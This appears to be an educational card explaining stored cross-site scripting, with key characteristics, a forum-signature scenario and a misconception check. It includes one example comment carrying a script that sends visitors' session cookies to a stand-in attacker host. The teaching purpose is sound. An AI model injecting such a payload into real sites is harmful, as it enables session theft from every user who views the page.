XSS Type

Stored XSS: Persistent and Dangerous

Malicious script permanently saved on the target server.

Key Characteristics

  • Payload is stored on the server (e.g., database, comment section).
  • Executes automatically when a victim visits the affected page.
  • Does not require direct attacker interaction after initial injection.
  • Considered the most dangerous due to its widespread and persistent nature.
Key Takeaway

Stored XSS is persistent, meaning the malicious script is saved on the server and affects all users viewing the compromised content, making it highly impactful.

Example: Malicious Comment

<div class="comment">  <p>Great post!</p>  <!-- Attacker's injected script -->  <script>new Image().src="http://attacker.com/log?c="+document.cookie;</script></div>

When a user views this comment, their browser executes the script, sending their session cookie to the attacker.

Scenario Card

An attacker posts a malicious script in a forum signature. Every user who views a post by that attacker will have their browser execute the script.

Misconception Check

Stored XSS doesn't require a malicious link; the vulnerability is in the application's persistent storage of unsafe input.
